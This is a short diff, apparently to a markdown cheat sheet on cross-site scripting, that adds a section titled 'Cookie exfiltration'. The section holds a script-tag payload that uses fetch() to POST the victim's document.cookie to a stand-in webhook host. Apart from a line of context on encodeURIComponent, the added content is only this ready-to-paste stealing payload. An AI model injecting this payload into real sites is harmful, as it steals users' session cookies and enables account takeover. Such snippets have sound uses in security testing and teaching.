@@ -124,4 +124,14 @@ document.createElement("image")
 
 The encodeURIComponent() function encodes a URI by replacing each instance of certain characters by one, two, three, or four escape sequences representing the UTF-8
 
+Cookie exfiltration
+```js
+<script>
+fetch('https://webhook', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
 ---
